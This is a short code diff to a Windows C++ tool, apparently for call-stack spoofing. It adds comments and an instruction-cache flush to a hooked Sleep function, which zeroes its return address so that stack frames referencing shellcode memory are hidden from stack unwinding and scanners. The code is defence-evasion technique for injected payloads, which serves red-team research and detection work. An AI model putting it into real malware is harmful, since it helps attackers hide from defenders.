@@ -9,11 +9,21 @@ void WINAPI MySleep(DWORD _dwMilliseconds)
 {
     const register DWORD dwMilliseconds = _dwMilliseconds;
 
-    // Perform this (current) thread call stack spoofing.
+    //
+    // Locate this stack frame's return address.
+    // 
     PULONG_PTR overwrite = (PULONG_PTR)_AddressOfReturnAddress();
     const register ULONG_PTR origReturnAddress = *overwrite;
 
-    log("[>] Original return address: 0x", std::hex, std::setw(8), std::setfill('0'), origReturnAddress, ". Finishing call stack...");
+    log("[>] Original return address: 0x", 
+        std::hex, std::setw(8), std::setfill('0'), origReturnAddress, 
+        ". Finishing call stack...");
+
+    //
+    // By overwriting the return address with 0 we're basically telling call stack unwinding algorithm
+    // to stop unwinding call stack any further, as there further frames. This we can hide our remaining stack frames
+    // referencing shellcode memory allocation from residing on a call stack.
+    //
     *overwrite = 0;
 
     log("\n===> MySleep(", std::dec, dwMilliseconds, ")\n");
@@ -92,6 +102,17 @@ bool fastTrampoline(bool installHook, BYTE* addressToHook, LPVOID jumpAddress, H
             output = true;
         }
     }
+
+    static typeNtFlushInstructionCache pNtFlushInstructionCache = NULL;
+    if (!pNtFlushInstructionCache)
+        pNtFlushInstructionCache = (typeNtFlushInstructionCache)
+            GetProcAddress(GetModuleHandleA("ntdll"), "NtFlushInstructionCache");
+
+    //
+    // We're flushing instructions cache just in case our hook didn't kick in immediately.
+    //
+    if (pNtFlushInstructionCache)
+        pNtFlushInstructionCache(GetCurrentProcess(), addressToHook, dwSize);
 
     ::VirtualProtect(
         addressToHook,
